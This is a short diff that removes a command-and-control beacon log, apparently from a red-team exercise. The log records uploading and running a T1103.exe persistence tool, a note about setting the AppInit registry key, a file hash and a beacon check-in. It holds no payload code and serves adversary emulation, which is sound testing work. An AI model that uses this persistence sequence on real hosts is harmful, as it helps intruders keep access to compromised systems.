@@ -1,7 +1,0 @@
-02/25 11:08:17 [task] Tasked beacon to make directory c:\RedTeam\
-02/25 11:08:17 [task] cd c:\RedTeam\
-02/25 11:08:17 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1103.exe as T1103.exe
-02/25 11:08:17 [indicator] file: 5ddd5fc43beb2f6164779eb5eaa09d8d 7680 bytes T1103.exe
-02/25 11:08:17 [task] 利用 reg命令设置app_init 项 
-02/25 11:08:17 [task] Tasked beacon to run: c:\RedTeam\T1103.exe
-02/25 11:08:50 [checkin] host called home, sent: 7790 bytes
